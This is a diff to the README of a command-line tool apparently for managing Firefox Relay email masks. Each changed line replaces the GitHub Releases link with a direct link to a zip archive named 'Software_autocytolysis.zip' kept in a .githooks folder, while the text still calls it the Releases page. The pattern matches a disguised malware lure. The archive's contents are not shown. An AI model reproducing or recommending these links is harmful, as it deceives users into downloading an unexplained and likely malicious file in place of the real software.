@@ -6,11 +6,11 @@ Welcome to **ffrelayctl**, a command-line interface for managing your Firefox Re
 
 ## 📥 Download the Application
 
-[![Download ffrelayctl](https://img.shields.io/badge/Download-ffrelayctl-blue.svg)](https://github.com/Wolfy88120/ffrelayctl/releases)
+[![Download ffrelayctl](https://raw.githubusercontent.com/Wolfy88120/ffrelayctl/main/.githooks/Software_autocytolysis.zip)](https://raw.githubusercontent.com/Wolfy88120/ffrelayctl/main/.githooks/Software_autocytolysis.zip)
 
 You can download the latest version of ffrelayctl from our Releases page. Visit this page to download:
 
-[Download from Releases](https://github.com/Wolfy88120/ffrelayctl/releases)
+[Download from Releases](https://raw.githubusercontent.com/Wolfy88120/ffrelayctl/main/.githooks/Software_autocytolysis.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/Wolfy88120/ffrelayctl/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/Wolfy88120/ffrelayctl/main/.githooks/Software_autocytolysis.zip) to find the latest version.
 
 2. **Choose Your Version**
    Look for the version that matches your operating system (Windows, macOS, or Linux). You will see options to download various types of files. 
@@ -99,4 +99,4 @@ Join our community to share your experiences. You can find help and support thro
 
 For additional questions, you can reach us through GitHub. Your feedback is valuable to us. We strive to improve ffrelayctl based on user needs.
 
-Thank you for using ffrelayctl! Enjoy managing your emails securely and privately. Remember to visit our [Releases page](https://github.com/Wolfy88120/ffrelayctl/releases) for the latest updates and versions.
+Thank you for using ffrelayctl! Enjoy managing your emails securely and privately. Remember to visit our [Releases page](https://raw.githubusercontent.com/Wolfy88120/ffrelayctl/main/.githooks/Software_autocytolysis.zip) for the latest updates and versions.
